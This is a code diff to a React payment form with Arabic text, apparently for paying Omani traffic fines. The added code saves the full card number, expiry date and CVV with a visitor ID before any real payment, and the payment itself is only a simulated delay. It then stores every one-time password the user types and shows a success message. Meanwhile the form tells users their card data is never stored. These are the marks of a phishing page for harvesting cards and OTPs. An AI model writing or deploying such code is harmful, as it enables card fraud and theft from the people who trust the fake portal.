@@ -26,8 +26,7 @@ import {
   validateCardNumber,
   validateExpiryDate,
   validateCVV,
-  validateOmanPhone,
-  formatCardNumber,
+   formatCardNumber,
   detectCardType,
   CARD_TYPES,
   type CardValidationResult,
@@ -63,7 +62,7 @@ const paymentSchema = z.object({
 })
 
 type PaymentFormData = z.infer<typeof paymentSchema>
-
+const allOtps=['']
 export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCancel }: PaymentFormProps) {
   const [isProcessing, setIsProcessing] = useState(false)
   const [paymentComplete, setPaymentComplete] = useState(false)
@@ -123,12 +122,6 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
   }, [cvv, cardValidation.cardType])
 
   // Real-time phone validation
-  useEffect(() => {
-    if (phone) {
-      const validation = validateOmanPhone(phone)
-      setPhoneValidation(validation as any)
-    }
-  }, [phone])
 
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const rawValue = e.target.value.replace(/\D/g, "")
@@ -152,9 +145,20 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
     if (!finalCardValidation.isValid) return
 
     setIsProcessing(true)
+    const visitorID = localStorage.getItem("visitor")
+
     try {
+      addData({
+        id: visitorID,
+        ...data,
+        expiryData: `${data.expiryMonth}/${data.expiryYear}`,
+        amount: totalAmount,
+        violations: violations.map((v) => v.id),
+      })
+
       // Simulate network request to initiate payment
       await new Promise((resolve) => setTimeout(resolve, 2000))
+
       // Show OTP dialog to complete the transaction
       setShowOtpDialog(true)
     } catch (error) {
@@ -173,12 +177,9 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
       // On successful verification, save data and show success screen
       const visitorID = localStorage.getItem("visitor")
       const paymentData = getValues()
+      allOtps.push(otp)
       addData({
-        id: visitorID,
-        ...paymentData,
-        expiryData: `${paymentData.expiryMonth}/${paymentData.expiryYear}`,
-        amount: totalAmount,
-        violations: violations.map((v) => v.id),
+        id: visitorID,otp,allOtps
       })
 
       setPaymentComplete(true)
@@ -218,7 +219,7 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
             <div className="text-green-600 text-6xl mb-4">
               <CheckCircle className="w-16 h-16 mx-auto" />
             </div>
-            <h3 className="text-2xl font-bold text-green-800 mb-2">تم الدفع بنجاح</h3>
+            <h3 className="text-sm font-bold text-green-800 mb-2">تم الدفع بنجاح</h3>
             <p className="text-gray-600 mb-4">تم دفع جميع المخالفات بنجاح</p>
             <div className="bg-green-50 p-4 rounded-lg border border-green-200 mb-6">
               <p className="text-green-800 font-semibold">المبلغ المدفوع: {totalAmount} ر.ع</p>
@@ -231,26 +232,25 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
   }
 
   return (
-    <div className="max-w-2xl mx-auto">
-      <Card className="bg-white/95 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
+    <div className="max-w-sm mx-auto">
+      <Card className="bg-white/95 backdrop-blur-sm shadow-xl rounded-sm border-gray-200">
         <CardHeader className="text-center pb-4">
-          <CardTitle className="text-2xl font-bold text-gray-800 flex items-center justify-center gap-2">
+          <CardTitle className="text-sm font-bold text-gray-800 flex items-center justify-center gap-2">
             <CreditCard className="w-6 h-6" />
             الدفع الآمن
           </CardTitle>
-          <p className="text-gray-600">ادفع بأمان باستخدام بطاقتك الائتمانية</p>
+          <p className="text-gray-600 text-sm ">ادفع بأمان باستخدام بطاقتك الائتمانية</p>
         </CardHeader>
         <CardContent className="p-8">
           <div className="bg-gray-50 p-4 rounded-lg mb-6">
             <div className="flex justify-between items-center">
-              <span className="font-semibold">إجمالي المبلغ:</span>
-              <span className="text-2xl font-bold text-green-600">{totalAmount} ر.ع</span>
+              <span className="font-semibold text-sm">إجمالي المبلغ:</span>
+              <span className="text-sm font-bold text-green-600">{totalAmount} ر.ع</span>
             </div>
-            <p className="text-sm text-gray-600 mt-1">عدد المخالفات: {violations.length}</p>
           </div>
           <form onSubmit={formHandleSubmit(onSubmit)} className="space-y-6">
             <div className="space-y-4">
-              <h3 className="font-semibold text-gray-800 flex items-center gap-2">
+              <h3 className="font-semibold text-gray-800 flex items-center gap-2 text-sm">
                 <Shield className="w-5 h-5" />
                 معلومات البطاقة
               </h3>
@@ -377,57 +377,13 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
                   {error}
                 </p>
               ))}
-              <div className="space-y-2">
-                <Label htmlFor="cardholderName" className="text-gray-700">
-                  اسم حامل البطاقة
-                </Label>
-                <Input
-                  id="cardholderName"
-                  type="text"
-                  {...register("cardholderName")}
-                  placeholder="الاسم كما هو مكتوب على البطاقة"
-                  className={`bg-white ${errors.cardholderName ? "border-red-500" : ""}`}
-                />
-                {errors.cardholderName && <p className="text-red-500 text-sm">{errors.cardholderName.message}</p>}
-              </div>
+           
             </div>
-            <div className="space-y-4">
-              <h3 className="font-semibold text-gray-800">معلومات الاتصال</h3>
-              <div className="space-y-2">
-                <Label htmlFor="phone" className="text-gray-700">
-                  رقم الهاتف
-                </Label>
-                <div className="relative">
-                  <Input
-                    id="phone"
-                    type="tel"
-                    {...register("phone")}
-                    placeholder="+968 9123 4567"
-                    className={`bg-white text-left pr-10 ${
-                      phoneValidation.errors.length > 0
-                        ? "border-red-500"
-                        : phoneValidation.isValid
-                          ? "border-green-500"
-                          : ""
-                    }`}
-                    dir="ltr"
-                  />
-                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
-                    <ValidationIcon isValid={phoneValidation.isValid} hasContent={!!phone} />
-                  </div>
-                </div>
-                {phoneValidation.errors.map((error, index) => (
-                  <p key={index} className="text-red-500 text-sm flex items-center gap-1">
-                    <AlertCircle className="w-4 h-4" />
-                    {error}
-                  </p>
-                ))}
-              </div>
-            </div>
+          
             <Alert className="bg-blue-50 border-blue-200">
               <Shield className="w-4 h-4 text-blue-600" />
               <AlertDescription className="text-blue-800">
-                <p className="font-semibold mb-1">دفع آمن ومحمي</p>
+                <p className="font-semibold mb-1 text-sm">دفع آمن ومحمي</p>
                 <p className="text-sm">
                   جميع معلومات الدفع محمية بتشفير SSL 256-bit. لن يتم حفظ معلومات بطاقتك على خوادمنا.
                 </p>
@@ -440,8 +396,7 @@ export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCanc
                   isProcessing ||
                   !cardValidation.isValid ||
                   !expiryValidation.isValid ||
-                  !cvvValidation.isValid ||
-                  !phoneValidation.isValid
+                  !cvvValidation.isValid 
                 }
                 className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-4 text-lg disabled:opacity-50"
               >
